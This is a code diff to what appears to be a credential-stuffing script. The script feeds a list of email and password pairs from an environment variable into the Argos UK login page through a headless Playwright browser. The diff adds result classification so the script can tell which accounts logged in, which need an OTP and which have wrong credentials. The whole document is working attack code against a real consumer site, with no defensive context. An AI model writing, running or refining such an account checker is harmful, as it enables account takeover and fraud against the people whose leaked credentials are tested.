@@ -18,6 +18,11 @@ const LOGIN_URL = 'https://www.argos.co.uk/login';
 const logins = process.env.LOGINS.split('\n').filter(Boolean);
 
 (async () => {
+  if (!process.env.LOGINS) {
+    console.log('❌ No logins received');
+    return;
+  }
+
   const browser = await chromium.launch({ headless: true });
 
   let ok = 0;
@@ -33,7 +38,6 @@ const logins = process.env.LOGINS.split('\n').filter(Boolean);
     const { email, password } = parsed;
     console.log(`➡️ Trying ${email}`);
 
-    // 🔐 NEW SESSION PER LOGIN
     const context = await browser.newContext();
     const page = await context.newPage();
 
@@ -44,19 +48,29 @@ const logins = process.env.LOGINS.split('\n').filter(Boolean);
       await page.fill('input[type="password"]', password);
       await page.click('button:has-text("Sign in securely")');
 
-      // ✅ SUCCESS = login form gone
-      await page.waitForSelector(
-        'input[type="email"]',
-        { state: 'detached', timeout: 7000 }
-      );
+      await page.waitForTimeout(3000);
 
-      console.log(`✅ ${email}`);
-      ok++;
+      const stillHasForm = await page.$('input[type="email"]');
+      const pageText = await page.textContent('body');
+
+      if (!stillHasForm) {
+        console.log(`✅ ${email} (logged in)`);
+        ok++;
+      } else if (pageText && /code|otp|verify/i.test(pageText)) {
+        console.log(`⚠️ ${email} (OTP required)`);
+        fail++;
+      } else if (pageText && /incorrect|invalid|wrong/i.test(pageText)) {
+        console.log(`❌ ${email} (invalid credentials)`);
+        fail++;
+      } else {
+        console.log(`❌ ${email} (login did not complete)`);
+        fail++;
+      }
     } catch (err) {
-      console.log(`❌ ${email}`);
+      console.log(`❌ ${email} (exception)`);
       fail++;
     } finally {
-      await context.close();
+      await context.close(); // 🔑 IMPORTANT
     }
 
     await page.waitForTimeout(1500);
